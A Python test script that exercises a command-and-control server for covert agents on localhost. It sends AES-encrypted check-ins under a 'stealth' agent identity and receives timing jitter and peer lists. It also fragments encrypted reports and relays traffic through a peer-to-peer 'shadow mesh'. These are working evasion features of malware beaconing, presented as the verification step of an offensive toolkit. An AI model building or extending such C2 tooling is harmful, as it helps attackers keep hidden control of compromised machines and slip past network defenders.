import requests
import json
import base64
import time
import uuid
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib

# C2 Details
C2_URL = "http://localhost:9001/api/hive"
AGENT_ID = "AGENT_PHASE_45_STELATH"


class MockCipher:
    def __init__(self, key_material):
        self.key = hashlib.sha256(key_material).digest()

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC)
        iv = cipher.iv
        ct = cipher.encrypt(pad(data.encode(), AES.block_size))
        return base64.b64encode(iv + ct).decode()

    def decrypt(self, enc_data):
        data = base64.b64decode(enc_data)
        iv = data[:16]
        ct = data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        from Crypto.Util.Padding import unpad

        return unpad(cipher.decrypt(ct), 16).decode()


# Initialize Cipher
today = datetime.now().strftime("%Y-%m-%d")
passphrase = b"RedKing_Global_Sovereignty_Protocol_2026"
cipher = MockCipher(passphrase + today.encode())


def test_checkin_jitter():
    print("[*] Testing Jitter Check-in...")
    payload = {
        "agent_id": AGENT_ID,
        "info": {"os": "Windows 11", "user": "StealthAdmin"},
    }
    enc = cipher.encrypt(json.dumps(payload))
    res = requests.post(f"{C2_URL}/checkin", json={"data": enc})
    if res.status_code == 200:
        resp_data = res.json().get("data")
        dec = json.loads(cipher.decrypt(resp_data))
        print(f"[+] Server requested jitter delay: {dec.get('jitter')}s")
        print(f"[+] Peer list received: {len(dec.get('peers'))} nodes")
        return dec.get("jitter")


def test_fragmentation():
    print("\n[*] Testing Payload Fragmentation...")
    large_log = "CRITICAL_LOG_DATA_PAYLOAD_" * 10
    payload = {"agent_id": AGENT_ID, "type": "log", "msg": large_log}
    full_enc = cipher.encrypt(json.dumps(payload))

    # Split into 3 fragments
    parts = 3
    chunk_size = len(full_enc) // parts + 1
    session_id = str(uuid.uuid4())[:8]

    for i in range(parts):
        fragment = full_enc[i * chunk_size : (i + 1) * chunk_size]
        msg = {
            "session_id": session_id,
            "part": i,
            "total": parts,
            "data": fragment,
            "fragmented": True,
        }
        res = requests.post(f"{C2_URL}/report", json=msg)
        print(f"[-] Fragment {i+1}/{parts} sent: {res.json().get('status')}")


def test_p2p_relay():
    print("\n[*] Testing P2P Shadow Mesh Relay...")
    # Agent A relays for Agent B
    relay_payload = {
        "agent_id": AGENT_ID,
        "relay_from": "AGENT_GHOST_B",
        "type": "log",
        "msg": "Transmitting via Agent A Proxy",
    }
    enc = cipher.encrypt(json.dumps(relay_payload))
    res = requests.post(f"{C2_URL}/report", json={"data": enc})
    print(f"[+] Relay Report Status: {res.json().get('status')}")


if __name__ == "__main__":
    jitter = test_checkin_jitter()
    test_fragmentation()
    test_p2p_relay()
    print("\n[!] Phase 45 Verification Complete.")
